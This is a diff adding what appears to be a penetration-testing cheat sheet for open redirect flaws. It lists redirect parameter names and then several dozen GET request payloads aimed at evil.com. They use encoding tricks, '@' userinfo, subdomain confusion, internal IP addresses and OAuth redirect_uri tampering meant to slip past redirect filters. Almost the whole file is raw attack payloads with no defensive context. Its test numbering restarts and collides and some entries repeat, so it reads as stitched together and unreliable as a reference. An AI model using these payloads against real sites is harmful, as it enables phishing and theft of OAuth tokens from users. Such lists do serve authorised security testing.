@@ -1,0 +1,45 @@
+open redirect parameters: redirect_to, redirect_url, redirect_uri, redirect_uri
+return_to, return_url, return_uri, next
+next_url, next_page, continue, continue_url
+go, goto, goto_url, forward
+url, target, dest, destination, return_to
+callback, callback_url, redirect
+
+payloads: GET /redirect?url=https://evil.com
+→ Observe response (blocked/allowed)
+# Test 2: Double Slash
+GET /redirect?url=//evil.com
+→ Does this bypass?
+# Test 3: Scheme Variants
+GET /redirect?url=http://evil.com
+GET /redirect?url=https://evil.com
+GET /redirect?url=//evil.com
+GET /redirect?url=///evil.com
+
+# Test 1: Same-Domain Bypass
+GET /redirect?url=/../evil.com
+GET /redirect?url=example.com.evil.com
+GET /redirect?url=evil.com%2f%2fexample.com
+# Test 2: Double Encoding
+GET /redirect?url=https%3A%2F%2Fevil.com
+GET /redirect?url=https%253A%252F%252Fevil.com
+GET /redirect?url=https%25253A%25252F%25252Fevil.com
+# Test 3: Port Specification
+GET /redirect?url=https://evil.com:443
+GET /redirect?url=https://evil.com:80
+GET /redirect?url=https://evil.com:8080
+# Technique 1: Username/Password
+GET /redirect?url=https://evil.com@example.com
+GET /redirect?url=//evil.com:80@example.com
+# Technique 2: Subdomain Confusion
+GET /redirect?url=https://evil.com.example.com
+GET /redirect?url=https://example.com.evil.com
+# Technique 3: IP Addresses
+GET /redirect?url=http://127.0.0.1
+GET /redirect?url=http://192.168.1.1
+GET /redirect?url=http://0x7f000001
+# Test OAuth Callback Manipulation
+GET /oauth/authorize?redirect_uri=https://evil.com
+GET /oauth/authorize?redirect_uri=//evil.com
+GET /oauth/authorize?redirect_uri=/../evil.com
+GET /oauth/authorize?redirect_uri=https://evil.com%2f..%2f
